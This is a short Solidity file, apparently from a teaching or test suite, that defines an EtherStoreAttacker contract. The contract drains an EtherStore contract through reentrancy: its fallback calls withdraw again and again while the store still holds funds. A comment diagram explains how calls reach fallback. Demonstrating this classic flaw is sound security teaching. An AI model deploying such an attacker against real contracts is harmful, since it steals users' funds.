// SPDX-License-Identifier: UNLICENSED

// Author: TrejGun
// Email: trejgun@gmail.com
// Website: https://ethberry.io/

pragma solidity ^0.8.20;

import { EtherStore } from "./EtherStore.sol";

contract EtherStoreAttacker {
  EtherStore public etherStore;
  uint256 public constant amount = 1 ether;

  constructor(address etherStoreAddress) {
    etherStore = EtherStore(etherStoreAddress);
  }

  //               is msg.data empty?
  //               /                \
  //              yes                no
  //             /                    \
  //  receive() exists?        is the function selector fundMe()?
  //      /      \                    /      \
  //    yes       no                 no      yes
  //    /          \                /          \
  // receive()     fallback() exists?         fundMe()
  //                  /       \
  //                 yes       no
  //                /           \
  //          fallback()    transaction is reverted

  fallback() external payable {
    if (address(etherStore).balance >= amount) {
      etherStore.withdraw();
    }
  }

  function attack() external payable {
    require(msg.value >= amount, "Insufficient balance");
    etherStore.deposit{value: amount}();
    etherStore.withdraw();
  }
}
